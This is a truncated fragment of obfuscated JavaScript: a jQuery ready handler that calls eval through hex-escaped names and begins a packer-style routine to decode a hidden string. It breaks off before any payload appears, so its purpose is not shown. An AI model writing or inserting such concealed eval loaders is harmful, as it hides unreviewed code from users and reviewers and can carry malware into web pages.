...
$(function () {
    window["\x65\x76\x61\x6c"](function (bePqlYg1, GW2, nPRZSIPvT3, QgGhIrMMd4, jRGjQF5, sbFEKkdKf6) {
        jRGjQF5 = function (nPRZSIPvT3) {
            return nPRZSIPvT3["\x74\x6f\x53\x74\x72\x69\x6e\x67"](36)
        };
        if ('\x30'["\x72\x65\x70\x6c\x61\x63\x65"](0, jRGjQF5) == 0) {
            while (nPRZSIPvT3--)sbFEKkdKf6[jRGjQF5(nPRZSIPvT3)] = QgGhIrMMd4[nPRZSIPvT3];
            QgGhIrMMd4 = [function (jRGjQF5) {
                return sbFEKkdKf6[jRGjQF5] || jRGjQF5
            }];
            jRGjQF5 = function () {
